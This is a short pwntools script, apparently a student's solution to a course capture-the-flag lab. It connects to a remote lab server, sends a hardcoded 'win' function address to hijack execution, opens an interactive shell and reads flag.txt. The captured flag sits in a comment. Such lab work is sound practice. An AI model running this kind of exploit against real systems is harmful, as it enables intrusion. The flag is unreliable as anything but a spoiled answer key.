from pwn import *
import os

# connect to local binary process
# p = processs("./lab1-2.bin")

# connect to remote server process at port 7011
p = remote("csc748.hostbin.org", 7012)

# read response
response = p.recvline()

# print response
# s = p.recv(15)
print(f"The secret string was: {response}")

# send back hardcoded address of "win" fiction in decimal
# "win" function address is 0x40130f or 4199183 in decimal
p.sendline(4199183)

# establish interactive session 
p.interactive()

# print flag.txt
# Flag to fetched is: flag{082f90215133f4755f27ec6850b1eecc}
os.system("cat flag.txt")



